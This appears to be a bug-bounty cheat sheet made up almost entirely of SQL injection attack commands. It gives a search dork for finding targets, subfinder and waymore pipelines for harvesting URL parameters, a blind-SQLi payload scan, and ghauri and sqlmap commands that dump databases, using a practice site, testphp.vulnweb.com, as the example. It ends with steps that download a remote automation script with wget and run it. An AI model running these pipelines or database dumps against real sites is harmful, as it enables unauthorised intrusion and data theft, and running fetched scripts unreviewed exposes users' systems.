## Dork

```
site:.com & ext:php | ext:asp | ext:aspx | ext:jsp | ext:jspx & intitle:"responsible disclosure"
```
<a href="https://gist.githubusercontent.com/derlin/421d2bb55018a1538271227ff6b1299d/raw/3a131d47ca322a1d001f1f79333d924672194f36/country-codes-tlds.json">More country tlds</a>
<a href="https://github.com/HackShiv/OneDorkForAll/blob/main/dorks/Bug%20Bounty%20dork.txt" >More bug bounty dorks</a>

## All Parameter Finding

```
subfinder -d "vulnweb.com" -recursive -all -silent | while read domains; do waymore -i "$domains" -fc 301,302,303,304,307,308 -n -mode U | qsreplace "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | sort -u | tee vulnweb.com.parameters.txt; done
```

## Only SQLi Parameters

```
subfinder -d "vulnweb.com" -recursive -all -silent | while read domains; do waymore -i "$domains" -fc 301,302,303,304,307,308 -n -mode U | gf sqli | qsreplace "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | sort -u | tee vulnweb.com.parameters.txt; done
```
<a href="https://github.com/freelancermijan/.gf/blob/main/sqli.json">All SQLi Parameters</a>

## Blind SQLi Detection

```
bsqli --urls vulnweb.com.sql.parameters.txt --payloads payloads/xor.txt --verbose --save vulnweb.com.detected.sql.parameters.txt
```
<a href="https://github.com/coffinsp/payloads">More payloads</a>

## Ghauri DB Dumping

```
ghauri -u "http://testphp.vulnweb.com/artists.php?artist=*" --batch --confirm --current-db --dbs
```

## SQLMAP DB Dumping

```
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=*" --batch --dbs --random-agent --tamper=space2comment --level=2
```

#### Install Automation script

```
sudo rm -rf sqli.sh
wget https://raw.githubusercontent.com/freelancermijan/my-oneliners/refs/heads/main/sqli/sqli.sh
sudo chmod +x ./*.sh
./sqli.sh -h
```
